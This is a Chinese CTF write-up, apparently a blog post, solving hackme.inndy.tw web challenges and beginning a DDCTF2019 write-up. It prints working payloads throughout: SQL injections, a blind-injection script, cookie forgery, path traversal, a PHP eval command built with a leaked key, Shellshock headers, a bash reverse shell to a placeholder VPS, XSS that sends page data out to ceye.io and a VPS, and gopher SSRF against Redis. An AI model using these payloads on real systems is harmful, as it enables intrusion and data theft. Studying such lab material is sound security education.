safe_filter($str)\n{\n    $strl = strtolower($str);\n    if (strstr($strl, 'or 1=1') || strstr($strl, 'drop') ||\n        strstr($strl, 'update') || strstr($strl, 'delete')\n    ) {\n        return '';\n    }\n    return str_replace(\"'\", \"\\\\\\\\'\", $str);\n}\n$_\n```\n\n可以看到，题目过滤了 `or 1=1` 等字符，还会用反斜杠转义单引号，漏洞点就在于本题只转义引号，不转义其它字符，所以我们可以考虑用自己提交的反斜杠转义掉引号前面的反斜杠，这样引号就被脱出来了，于是我们可以成功闭合，另外由于题目转义了引号，我们在构造admin登录的时候，可以使用16进制绕过，最终payload如下\n\n```\nname=guest\\' or user=0x61646d696e-- +&password=guest\n```\n\n# login as admin 0.1 \n\n上个题目的加强版，直接union注入即可，最终payload如下\n\n```\nname=guest\\'  union select 1,the_f14g,3,3 from h1dden_f14g-- +&password=123465\n```\n\n# login as admin 1\n\n题目过滤并不严格，payload如下\n\n```\nadmin\\'/**/or/**/1/**/limit/**/0,1#\n```\n\n# login as admin 1.2\n\n上一题的加强版，需要进行盲注，代码如下\n\n```python\nimport requests\n\nurl = \"https://hackme.inndy.tw/login1/index.php\"\nlength = 1\nflag = \"\"\n\n# payload1 = r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr(database(),{},1))={})#\"\n# database:login_as_admin1\n# payload1 = r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),{},1))={})#\"\n# tables: 0bdb54c98123f5526ccaed982d2006a9,users\n# payload1 = r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x3062646235346339383132336635353236636361656439383264323030366139),{},1))={})#\"\n# id,4a391a11cfa831ca740cf8d00782f3a6\n\npayload1 = r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(4a391a11cfa831ca740cf8d00782f3a6)/**/from/**/0bdb54c98123f5526ccaed982d2006a9),{},1))={})#\"\t\ndata = {'name':r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr(database(),{},1))>{})#\", 'password':\"123\"}\nfor i in range(0,70):\n\tfor j in range(32,128):\n\t\tdata['name'] = payload1.format(str(length),str(j))\n\t\tcontent = requests.post(url,data=data).text\n\t\tif \"FLAG\" in content:\n\t\t\tflag += chr(j)\n\t\t\tprint('**flag:**',flag)\n\t\t\tlength += 1\n\t\t\tbreak\n```\n\n# login as admin 3 \t\n\n题目要求我们以admin身份登录，漏洞点在于验证登录时的判断使用了 `!=` ，这就存在弱比较的漏洞\n\n```php\nfunction load_user()\n{\n    global $secret, $error;\n    if(empty($_COOKIE['user'])) {\n        return null;\n    }\n    $unserialized = json_decode(base64_decode($_COOKIE['user']), true);\n    $r = hash_hmac('sha512', $unserialized['data'], $secret) != $unserialized['sig'];\n    if(hash_hmac('sha512', $unserialized['data'], $secret) != $unserialized['sig']) {\n        $error = 'Invalid session';\n        return false;\n    }\n    $data = json_decode($unserialized['data'], true);\n    return [\n        'name' => $data[0],\n        'admin' => $data[1]\n    ];\n}\n```\n\n我们只要使$unserialized['sig']的值为数字0即可绕过验证\n\n那么我们构造一个cookie\n\n```php\n<?php \nfunction set_user()\n{\n    global $user, $secret;\n    $user = ['admin', true];\n    $data = json_encode($user);\n    $sig = 0;\n    $all = base64_encode(json_encode(['sig' => $sig, 'data' => $data]));\n    return $all;\n}\necho set_user();\n?>\n```\n\n然后刷新即可\n\n# login as admin 4\n\n题目存在逻辑漏洞，重定向之后并没有exit，所以导致最终的判断被执行，所以我们只需要提交name为admin即可\n\n```bash\ncurl -d \"name=admin\" https://hackme.inndy.tw/login4/\n```\n\n# Login as Admin 6\n\n```php\nif(!empty($_POST['data'])) {\n    try {\n        $data = json_decode($_POST['data'], true);\n    } catch (Exception $e) {\n        $data = [];\n    }\n    extract($data);\n    if($users[$username] && strcmp($users[$username], $password) == 0) {\n        $user = $username;\n    }\n}\n```\n\n看代码可知存在变量覆盖漏洞，构造json数据即可\n\n```php\ndata={\"users\":{\"admin\":\"snow\"},\"username\":\"admin\",\"password\":\"snow\"}\n```\n\n# login as admin 7\n\nmd5弱比较\n\n![payload](hackme/2.png)\n\n# dafuq-manager 1\n\n查看cookie可以发现 ***show_hidden*** 字段为 ***no***，改为***yes***刷新即可得到flag\n\n# dafuq-manager 2\n\n这是一道代码审计，这是我第一次做这种整个网站源码的审计，还是有点被惊到了，万事开头难，看了别人的思路，我也开始了自己的审计之路，题目要求我们以admin的身份登录查看flag\n\n推荐使用PHPstorm来审计这种代码，搜索定位函数和变量会方便一点，先查看入口文件index.php，找到了admin相关的部分\n\n```php\ncase \"admin\":\n        require \"./core/fun_admin.php\";\n        show_admin($GLOBALS[\"dir\"]);\n    break;\n```\n\n我们跟进fun_admin.php\n\n```php\nfunction show_admin($dir) {\n    $pwd = (($GLOBALS[\"permissions\"] & 2) == 2);\n    $admin = (($GLOBALS[\"permissions\"] & 4) == 4);\n    if (!$GLOBALS[\"require_login\"]) show_error($GLOBALS[\"error_msg\"][\"miscnofunc\"]);\n    if (isset($GLOBALS['__GET'][\"action2\"])) $action2 = $GLOBALS['__GET'][\"action2\"];\n    elseif (isset($GLOBALS['__POST'][\"action2\"])) $action2 = $GLOBALS['__POST'][\"action2\"];\n    else $action2 = \"\";\n    switch ($action2) {\n        case \"chpwd\":\n            if (!$pwd) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]);\n            changepwd($dir);\n            break;\n        case \"adduser\":\n            if (!$admin) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]);\n            adduser($dir);\n            break;\n        case \"edituser\":\n            if (!$admin) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]);\n            edituser($dir);\n            break;\n        case \"rmuser\":\n            if (!$admin) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]);\n            removeuser($dir);\n            break;\n        default:\n            if (!$pwd && !$admin) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]);\n            admin($admin, $dir);\n    }\n}\n```\n\n主要的限制条件在于\n\n```php\n$pwd = (($GLOBALS[\"permissions\"] & 2) == 2);\n$admin = (($GLOBALS[\"permissions\"] & 4) == 4);\n```\n\n我们跟进这个变量看一下\n\n```php\nfunction activate_user($user, $pass) {\n    $data = find_user($user, $pass);\n    if ($data == NULL) return false;\n    $GLOBALS['__SESSION'][\"s_user\"] = $data[0];\n    $GLOBALS['__SESSION'][\"s_pass\"] = $data[1];\n    $GLOBALS[\"home_dir\"] = $data[2];\n    $GLOBALS[\"home_url\"] = $data[3];\n    $GLOBALS[\"show_hidden\"] = $data[4];\n    $GLOBALS[\"no_access\"] = $data[5];\n    $GLOBALS[\"permissions\"] = $data[6];\n    return true;\n}\n```\n\n再定位到find_user()\n\n```php\nfunction &find_user($user, $pass) {\n    $cnt = count($GLOBALS[\"users\"]);\n    for ($i = 0;$i < $cnt;++$i) {\n        if ($user == $GLOBALS[\"users\"][$i][0]) {\n            if ($pass == NULL || ($pass == $GLOBALS[\"users\"][$i][1] && $GLOBALS[\"users\"][$i][7])) {\n                return $GLOBALS[\"users\"][$i];\n            }\n        }\n    }\n    return NULL;\n}\n```\n\n可以看到data来自于全局变量users中，那么我们在追踪到.htusers.php中的users变量\t\n\n```php\n$GLOBALS[\"users\"] = array(\n    array(\"guest\", \"084e0343a0486ff05530df6c705c8bb4\", \"./data/guest\", \"https://game1.security.ntu.st/data/guest\", 0, \"^.ht\", 1, 1),\n);\n```\n\n但是源代码泄露只给出guest的信息，而没有admin的信息，所以我们可以考虑尝试读取该PHP文件的内容，所以我们可以在代码中查找文件读取相关的的函数\n\n在fun_down.php文件中可以找到一个readfile()函数\n\n```php\n<?php\nrequire_once ('core/secure.php');\nfunction download_item($dir, $item) {\n    $item = basename($item);\n    if (($GLOBALS[\"permissions\"] & 01) != 01) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]);\n    if (!get_is_file($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"fileexist\"]);\n    if (!get_show_item($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]);\n    $abs_item = get_abs_item($dir, $item);\n    if (!file_in_web($abs_item) || stristr($abs_item, '.php') || stristr($abs_item, 'config')) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]);\n    $browser = id_browser();\n    header('Content-Type: ' . (($browser == 'IE' || $browser == 'OPERA') ? 'application/octetstream' : 'application/octet-stream'));\n    header('Expires: ' . gmdate('D, d M Y H:i:s') . ' GMT');\n    header('Content-Transfer-Encoding: binary');\n    header('Content-Length: ' . filesize($abs_item));\n    if ($browser == 'IE') {\n        header('Content-Disposition: attachment; filename=\"' . $item . '\"');\n        header('Cache-Control: must-revalidate, post-check=0, pre-check=0');\n        header('Pragma: public');\n    } else {\n        header('Content-Disposition: attachment; filename=\"' . $item . '\"');\n        header('Cache-Control: no-cache, must-revalidate');\n        header('Pragma: no-cache');\n    }\n    @readfile($abs_item);\n    exit;\n}\n```\n\n题目过滤部分如下\n\n```php\nif (($GLOBALS[\"permissions\"] & 01) != 01) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]);\n    if (!get_is_file($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"fileexist\"]);\n    if (!get_show_item($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]);\n    $abs_item = get_abs_item($dir, $item);\n    if (!file_in_web($abs_item) || stristr($abs_item, '.php') || stristr($abs_item, 'config')) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]);\n```\n\n我们要读取的是 `.config/.htusers.php` ，但是在题目的 `stristr($abs_item, '.php') || stristr($abs_item, 'config')` 过滤了config和php两个字段，显然无法读取，只得在看看其他的函数，在fun_edit.php中\n\n```php\nfunction edit_file($dir, $item) {\n    if (($GLOBALS[\"permissions\"] & 01) != 01) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]);\n    if (!get_is_file($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"fileexist\"]);\n    if (!get_show_item($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]);\n    $fname = get_abs_item($dir, $item);\n    if (!file_in_web($fname)) show_error($GLOBALS[\"error_msg\"][\"accessfile\"]);\n    if (isset($GLOBALS['__POST'][\"dosave\"]) && $GLOBALS['__POST'][\"dosave\"] == \"yes\") {\n        $item = basename(stripslashes($GLOBALS['__POST'][\"fname\"]));\n        $fname2 = get_abs_item($dir, $item);\n        if (!isset($item) || $item == \"\") show_error($GLOBALS[\"error_msg\"][\"miscnoname\"]);\n        if ($fname != $fname2 && @file_exists($fname2)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"itemdoesexist\"]);\n        savefile($dir, $fname2);\n        $fname = $fname2;\n    }\n    $fp = @fopen($fname, \"r\");\n    if ($fp === false) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"openfile\"]);\n    $s_item = get_rel_item($dir, $item);\n    if (strlen($s_item) > 50) $s_item = \"...\" . substr($s_item, -47);\n    show_header($GLOBALS[\"messages\"][\"actedit\"] . \": /\" . $s_item); \n```\n\n函数中有三条过滤\n\n```php\nif (($GLOBALS[\"permissions\"] & 01) != 01) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]);\nif (!get_is_file($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"fileexist\"]);\nif (!get_show_item($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]);\n```\n\n第一条权限验证guest权限显然是满足的，第二条判断文件是否存在，不需要考虑，第三个我们跟进函数看一下\n\n```php\nfunction get_show_item($dir, $item) {\n    if ($item == \".\" || $item == \"..\") return false;\n    if ($_COOKIE['help'] == 'me') {\n        $_COOKIE['help'] = null;\n        setcookie('help', '', time() - 9999999999);\n        echo '<script>alert(\"Very good. You know how to create cookie. How about tamper a cookie?\")</script>';\n    }\n    if (empty($_COOKIE['show_hidden'])) {\n        setcookie('show_hidden', 'no', time() + 3600);\n    }\n    if (substr($item, 0, 1) == \".\" && $GLOBALS[\"show_hidden\"] == false && $_COOKIE['show_hidden'] != 'yes') return false;\n    if ($GLOBALS[\"no_access\"] != \"\" && @eregi($GLOBALS[\"no_access\"], $item)) return false;\n    if ($GLOBALS[\"show_hidden\"] == false) {\n        $dirs = explode(\"/\", $dir);\n        foreach ($dirs as $i) if (substr($i, 0, 1) == \".\") return false;\n    }\n    return true;\n}\n```\n\n题目仅仅对$item进行了简单的过滤， `if ($item == \".\" || $item == \"..\") return false;` ，那么我们可以考虑用目录穿越 `../../` 绕过\n\n那么至此我们可以在网站中找到edit相关的函数，发起请求（注意cookie中show_hidden对应的值要改为yes）\n\n```\nhttps://dafuq-manager.hackme.inndy.tw/index.php?action=edit&item=../../../../../var/www/webhdisk/.config/.htusers.php&order=name&srt=yes&lang=en\n```\n\n于是可以读到目标文件\n\n![.htusers.php](hackme/3.png)\n\n然后用admin用户登录即可，注意密码要进行md5解密即可，密码为 `how do you turn this on` ，登录即可读取flag\n\n# dafuq-manager 3\n\n题目给出了信息\n\n> For flag3, you need a shell to get that. see $WEBROOT/flag3!\n\n这关我们需要getsheel读取文件，那么我们在源码中寻找可以执行系统命令的语句，在文件中尝试搜索关键词 `eval` ，在fun_debug.php中发现存在该函数，跟进一下\n\n```php\nfunction do_debug() {\n    assert(strlen($GLOBALS['secret_key']) > 40);\n    $dir = $GLOBALS['__GET']['dir'];\n    if (strcmp($dir, \"magically\") || strcmp($dir, \"hacker\") || strcmp($dir, \"admin\")) {\n        show_error('You are not hacky enough :(');\n    }\n    list($cmd, $hmac) = explode('.', $GLOBALS['__GET']['command'], 2);\n    $cmd = base64_decode($cmd);\n    $bad_things = array('system', 'exec', 'popen', 'pcntl_exec', 'proc_open', 'passthru', '`', 'eval', 'assert', 'preg_replace', 'create_function', 'include', 'require', 'curl',);\n    foreach ($bad_things as $bad) {\n        if (stristr($cmd, $bad)) {\n            die('2bad');\n        }\n    }\n    if (hash_equals(hash_hmac('sha256', $cmd, $GLOBALS[\"secret_key\"]), $hmac)) {\n        die(eval($cmd));\n    } else {\n        show_error('What does the fox say?');\n    }\n}\n```\n\n对于dir的过滤，我们可以利用strcmp的数组绕过特性来绕过，题目还过滤了一些系统函数，我们可以考虑通过base64编码绕过，而对于$GLOBALS['\\_\\_GET']['command']变量的生成，题目也给出了生成函数\n\n```php\nfunction make_command($cmd) {\n    $hmac = hash_hmac('sha256', $cmd, $GLOBALS[\"secret_key\"]);\n    return sprintf('%s.%s', base64_encode($cmd), $hmac);\n}\n```\n\n所以我们可以自己生成command\n\n```php\n<?php \nfunction make_command($cmd) {\n    $hmac = hash_hmac('sha256', $cmd, \"KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3\");\n    return sprintf('%s.%s', base64_encode($cmd), $hmac);\n}\nvar_dump(make_command('$a=\\'sys\\';$b=\\'tem\\';$c=$a.$b;$c(base64_decode(\\'Li9mbGFnMy9tZW93IGZsYWczL2ZsYWcz\\'));'));\n?>\n```\n\n注意本题不能直接读取flag，要通过运行目录下的一个c文件来间接读取flag，最终payload如下\n\n```\nhttps://dafuq-manager.hackme.inndy.tw/index.php?action=debug&dir[]=admin&command=JGE9J3N5cyc7JGI9J3RlbSc7JGM9JGEuJGI7JGMoYmFzZTY0X2RlY29kZSgnTGk5bWJHRm5NeTl0Wlc5M0lHWnNZV2N6TDJac1lXY3onKSk7.001e9b2112bdf0443a0eaf4a489f477d1cf525cf58f05286606007046856460b&order=name&srt=yes&lang=en\n```\n\n做完后感觉自己好菜呀，这代码审计的我晕头转向，233333...\n\n# wordpress 1\n\nWordPress代码审计，在backup file中可以下载到源码，打开源码，随便翻一下，在 `wp-content/plugins/core.php` 中发现了一段代码\n\n```php\nfunction print_f14g()\n{\n\t$h = 'm'.sprintf('%s%d','d',-4+9e0);\n\tif($h($_GET['passw0rd']) === '5ada11fd9c69c78ea65c832dd7f9bbde') {\n\t\tif(wp_get_user_ip() === '127.0.0.1') {\n\t\t\teval(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $h($_GET['passw0rd'].AUTH_KEY), base64_decode('zEFnGVANrtEUTMLVyBusu4pqpHjqhn3X+cCtepGKg89VgIi6KugA+hITeeKIpnQIQM8UZbUkRpuCe/d8Rf5HFQJSawpeHoUg5NtcGam0eeTw+1bnFPT3dcPNB8IekPBDyXTyV44s3yaYMUAXZWthWHEVDFfKSjfTpPmQkB8fp6Go/qytRtiP3LyYmofhOOOV8APh0Pv34VPjCtxcJUpqIw=='), MCRYPT_MODE_CBC, $h($_GET['passw0rd'].AUTH_SALT)));\n\t\t} else {\n\t\t\tdie('</head><body><h1>Sorry, Only admin from localhost can get flag');\n\t\t}\n\t}\n}\n```\n\n我们把代码中的md5解密一下发现是 `cat flag`，而题目要求从本地访问，我们可以通过修改x-forwarded-for字段实现，所以修改请求头之后，在访问\n\n```\nhttps://wp.hackme.inndy.tw/?passw0rd=cat%20flag\n```\n\n查看元素即可找到flag\n\n# wordpress 2\n\n随便翻一下博客上的文章，发现有2013年10月发表了一篇文章，题目为flag2，但是需要密码，审计代码发现在content-search.php中有如下语句\n\n```php\n<!-- debug:<?php var_dump($wp_query->post->{'post_'.(string)($_GET['debug']?:'type')}); ?> -->\n```\n\n看到query，应该是在搜索页面，所以我们提交的payload应该为\n\n```\nhttps://wp.hackme.inndy.tw/archives/date/2013/10?s=&debug=content\n```\n\n# command-executor\n\n随便点击，发现有func参数存在文件读取漏洞，利用filter协议可以读取文件\n\n```\nhttps://command-executor.hackme.inndy.tw/index.php?func=php://filter/read=convert.base64-encode/resource=index\n```\n\nbase64解码一下得到源代码\n\n```php\n<?php\n$pages = [\n    ['man', 'Man'],\n    ['untar', 'Tar Tester'],\n    ['cmd', 'Cmd Exec'],\n    ['ls', 'List files'],\n];\n\nfunction fuck($msg) {\n    header('Content-Type: text/plain');\n    echo $msg;\n    exit;\n}\n\n$black_list = [\n    '\\/flag', '\\(\\)\\s*\\{\\s*:;\\s*\\};'\n];\n\nfunction waf($a) {\n    global $black_list;\n    if(is_array($a)) {\n        foreach($a as $key => $val) {\n            waf($key);\n            waf($val);\n        }\n    } else {\n        foreach($black_list as $b) {\n            if(preg_match(\"/$b/\", $a) === 1) {\n                fuck(\"$b detected! exit now.\");\n            }\n        }\n    }\n}\n\nwaf($_SERVER);\nwaf($_GET);\nwaf($_POST);\n\nfunction execute($cmd, $shell='bash') {\n    system(sprintf('%s -c %s', $shell, escapeshellarg($cmd)));\n}\n\nforeach($_SERVER as $key => $val) {\n    if(substr($key, 0, 5) === 'HTTP_') {\n        putenv(\"$key=$val\");\n    }\n}\n\n$page = '';\n\nif(isset($_GET['func'])) {\n    $page = $_GET['func'];\n    if(strstr($page, '..') !== false) {\n        $page = '';\n    }\n}\n\nif($page && strlen($page) > 0) {\n    try {\n        include(\"$page.php\");\n    } catch (Exception $e) {\n    }\n}\n?>\n```\n\n题目有一个putenv()敏感函数，百度可知存在一个2014年的一个重大漏洞 `CVE-2014-6271(破壳（shellsock）漏洞)` ，在freebuf中有一个链接\n\n> http://www.freebuf.com/articles/system/45390.html\n\n国外有一个漏洞利用的文章，\n\n> https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php\n\n![exp](hackme/4.png)\n\n但是直接利用会被waf掉，所以我们要考虑绕过正则\n\n```\n'\\(\\)\\s*\\{\\s*:;\\s*\\};'\n```\n\n题目的正则中 `:;` 是存在漏洞的，我们可以用 `: ;` 绕过，重试一下发现可以成功，我们可以开始执行shell命令，尝试访问flag，一波探测之后发现读取flag时遇到了又遇到了waf，这次是 `\\/flag` 我们可以利用通配符绕过，\n\n```\nwget --header=\"X-Exploit: () { : ; }; /bin/cat ../../../?lag-reader.c\" -q -O -  \"https://command-executor.hackme.inndy.tw/index.php?func=cmd&cmd=env\"\n```\n\n但是并没有出现flag，发现是因为只有root才有文件的读权限\n\n![](hackme/5.png)\n\n但是题目中有一个flag-reader文件，我们尝试读取一下\n\n```\nwget --header=\"X-Exploit: () { : ; }; /bin/cat ../../../../../../?lag-reader.c\" -q -O - \"https://command-executor.hackme.inndy.tw/index.php?func=cmd&cmd=env\"\n```\n\n```c\ninclude <unistd.h>\n#include <syscall.h>\n#include <fcntl.h>\n#include <string.h>\n\nint main(int argc, char *argv[])\n{\n\tchar buff[4096], rnd[16], val[16];\n\tif(syscall(SYS_getrandom, &rnd, sizeof(rnd), 0) != sizeof(rnd)) {\n\t\twrite(1, \"Not enough random\\n\", 18);\n\t}\n\n\tsetuid(1337);\n\tseteuid(1337);\n\talarm(1);\n\twrite(1, &rnd, sizeof(rnd));\n\tread(0, &val, sizeof(val));\n\n\tif(memcmp(rnd, val, sizeof(rnd)) == 0) {\n\t\tint fd = open(argv[1], O_RDONLY);\n\t\tif(fd > 0) {\n\t\t\tint s = read(fd, buff, 1024);\n\t\t\tif(s > 0) {\n\t\t\t\twrite(1, buff, s);\n\t\t\t}\n\t\t\tclose(fd);\n\t\t} else {\n\t\t\twrite(1, \"Can not open file\\n\", 18);\n\t\t}\n\t} else {\n\t\twrite(1, \"Wrong response\\n\", 16);\n\t}\n}\n\n```\n\n代码的大致意思就是要我们一秒内把它输出的内容在输入回去，即可以打出文件内容，但是以我们现在的交互方式显然太慢了，最好反弹一个shell\n\n```\nwget --header=\"X-Exploit: () { : ; }; /bin/bash -i >& /dev/tcp/your_vps_ip/8888 0>&1\" -q -O -  \"https://command-executor.hackme.inndy.tw/index.php?func=cmd&cmd=env\"\n```\n\n又发现在/var/tmp目录是可写的，所以我们可以利用该目录来读flag\n\n```bash\nflag-reader flag > /var/tmp/content < /var/tmp/content\n```\n\n```\ncat content\n```\n\n# xssme\n\n先注册一个账号登录一下， 发现有一个send email功能，而题目又说xssme，猜测应该是存在xss漏洞，测试一下\n\n```\n<script>alert('123')</script>\n```\n\n回显script标签和（被过滤了，尝试绕过，onerror等也都被过滤了，发现可以用svg/onload来做\n\n![payload](hackme/7.png)\n\n然后在自己的ceve账号中收到回显\n\n![回显](hackme/6.png)\n\n# xssrf leak\n\n上一题中有一个PHPSESSID，尝试用这个cookie访问一下，可以看到页面有回显\n\n> Admin only allowed from localhost, but you came from 192.168.123.1\n\n修改了请求头也没有用，看了别人的思路我们可以利用xss来本地读取文件，看到了一个方法\n\n```\n<svg/onload=\"document.location='http://ov0eg5.ceye.io/?'+btoa(document.body.innerHTML)\">\n```\n\n但是遭到了过滤，我们可以考虑用HTML实体编码绕过\n\n```\n<svg/onload=\"&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#108;&#111;&#99;&#97;&#116;&#105;&#111;&#110;&#61;&#39;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#111;&#118;&#48;&#101;&#103;&#53;&#46;&#99;&#101;&#121;&#101;&#46;&#105;&#111;&#47;&#63;&#39;&#43;&#98;&#116;&#111;&#97;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#105;&#110;&#110;&#101;&#114;&#72;&#84;&#77;&#76;&#41;\">\n```\n\n果然可以收到payload，base64解码一下再保存为html格式打开\n\n![](hackme/8.png)\n\nsend request功能有个request.php，尝试读取该页面\n\n```\n<svg/onload=\"\nxmlhttp=new XMLHttpRequest();\nxmlhttp.onreadystatechange=function()\n{\n    if (xmlhttp.readyState==4 && xmlhttp.status==200)\n    {\n        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);\n    }\n}\nxmlhttp.open(\"GET\",\"request.php\",true);\nxmlhttp.send();\n\">\n```\n\n编码一下\n\n```\n<svg/onload=\"&#120;&#109;&#108;&#104;&#116;&#116;&#112;&#61;&#110;&#101;&#119;&#32;&#88;&#77;&#76;&#72;&#116;&#116;&#112;&#82;&#101;&#113;&#117;&#101;&#115;&#116;&#40;&#41;&#59;&#10;&#120;&#109;&#108;&#104;&#116;&#116;&#112;&#46;&#111;&#110;&#114;&#101;&#97;&#100;&#121;&#115;&#116;&#97;&#116;&#101;&#99;&#104;&#97;&#110;&#103;&#101;&#61;&#102;&#117;&#110;&#99;&#116;&#105;&#111;&#110;&#40;&#41;&#10;&#123;&#10;&#32;&#32;&#32;&#32;&#105;&#102;&#32;&#40;&#120;&#109;&#108;&#104;&#116;&#116;&#112;&#46;&#114;&#101;&#97;&#100;&#121;&#83;&#116;&#97;&#116;&#101;&#61;&#61;&#52;&#32;&#38;&#38;&#32;&#120;&#109;&#108;&#104;&#116;&#116;&#112;&#46;&#115;&#116;&#97;&#116;&#117;&#115;&#61;&#61;&#50;&#48;&#48;&#41;&#10;&#32;&#32;&#32;&#32;&#123;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#108;&#111;&#99;&#97;&#116;&#105;&#111;&#110;&#61;&#39;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#49;&#51;&#56;&#46;&#54;&#56;&#46;&#50;&#57;&#46;&#57;&#50;&#58;&#50;&#51;&#51;&#51;&#51;&#47;&#63;&#39;&#43;&#98;&#116;&#111;&#97;&#40;&#120;&#109;&#108;&#104;&#116;&#116;&#112;&#46;&#114;&#101;&#115;&#112;&#111;&#110;&#115;&#101;&#84;&#101;&#120;&#116;&#41;&#59;&#10;&#32;&#32;&#32;&#32;&#125;&#10;&#125;&#10;&#120;&#109;&#108;&#104;&#116;&#116;&#112;&#46;&#111;&#112;&#101;&#110;&#40;&#34;&#71;&#69;&#84;&#34;&#44;&#34;&#114;&#101;&#113;&#117;&#101;&#115;&#116;&#46;&#112;&#104;&#112;&#34;&#44;&#116;&#114;&#117;&#101;&#41;&#59;&#10;&#120;&#109;&#108;&#104;&#116;&#116;&#112;&#46;&#115;&#101;&#110;&#100;&#40;&#41;&#59;\">\n```\n\n然后在vps上即可收到base64字符串，解码\n\n![](hackme/9.png)\n\n这应该就是题目的利用位置，我们尝试读config.php文件\n\n```\n<svg/onload=\"\nxmlhttp=new XMLHttpRequest();\nxmlhttp.onreadystatechange=function()\n{\n    if (xmlhttp.readyState==4 && xmlhttp.status==200)\n    {\n        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);\n    }\n}\nxmlhttp.open(\"POST\",\"request.php\",true);\nxmlhttp.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");\nxmlhttp.send(\"url=file:///var/www/html/config.php\");\n\">\n```\n\n编码发送，果然可以收到flag\n\n![result](hackme/10.png)\n\n# xssrf redis\n\n```\n<svg/onload=\"\nxmlhttp=new XMLHttpRequest();\nxmlhttp.onreadystatechange=function()\n{\n    if (xmlhttp.readyState==4 && xmlhttp.status==200)\n    {\n        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);\n    }\n}\nxmlhttp.open(\"POST\",\"request.php\",true);\nxmlhttp.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");\nxmlhttp.send(\"url=gopher://127.0.0.1:25566/_KEYS%2520*%250a_quit\");\n\">\n```\n\n发现有flag，读取之\n\n```\nxmlhttp.send(\"url=gopher://127.0.0.1:25566/_lrange%2520flag%25200%252053%250a_quit\");\n```\n\n然后处理一下即可得到flag","tags":["CTF"],"categories":["writeup"]},{"title":"DDCTF2019","url":"/2020/09/13/DDCTF2019/","content":"\n\n历史文章补发\n\n<!-- more -->\n\n# 滴~\n\n签到题\n\n访问首页看到jpg参数请求有点想base64，测试发现是将文件名进行16进制编码后再进行两次base64编码，按照该方法构造index.php发现可以实现成功读取到index.php源码 \n\n```php\n/*\n * https://blog.csdn.net/FengBanLiuYun/article/details/80616607\n * Date: July 4,2018\n */\nerror_reporting(E_ALL || ~E_NOTICE);\nheader('content-type:text/html;charset=utf-8');\nif(! isset($_GET['jpg']))\n    header('Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09');\n$file = hex2bin(base64_decode(base64_decode($_GET['jpg'])));\necho '<title>'.$_GET['jpg'].'</title>';\n$file = preg_replace(\"/[^a-zA-Z0-9.]+/\",\"\", $file);\necho $file.'</br>';\n$file = str_replace(\"config\",\"!\", $file);\necho $file.'</br>';\n$txt = base64_encode(file_get_contents($file));\n\necho \"<img src='data:image/gif;base64,\".$txt.\"'></img>\";\n/*\n * Can you find the flag file?\n *\n */\n?>\n```\n\n发现了注释中有文章链接，访问之后看到历史文章有和注释中日期相同的文章，发现是swp文件泄露的相关文章，测试发现存在`practice.txt.swp`页面\n\n```\nf1ag!ddctf.php\n```\n\n我们可以按照上面的方法读取该文件，因为该页面过滤特殊字符，但是同时又把`config`替换为`!`，所以我们可以构造文件名`f1agconfigddctf.php`成功读取到源码\n\n```php\n<?php\ninclude('config.php');\n$k = 'hello';\nextract($_GET);\nif(isset($uid))\n{\n    $content=trim(file_get_contents($k));\n    if($uid==$content)\n\t{\n\t\techo $flag;\n\t}\n\telse\n\t{\n\t\techo'hello';\n\t}\n}\n?>\n```\n\n很明显的变量覆盖漏洞\n\n```\nhttp://117.51.150.246/f1ag!ddctf.php?uid=&k=\n```\n\n```\nDDCTF{436f6e67726174756c6174696f6e73}\n```\n\n# WEB 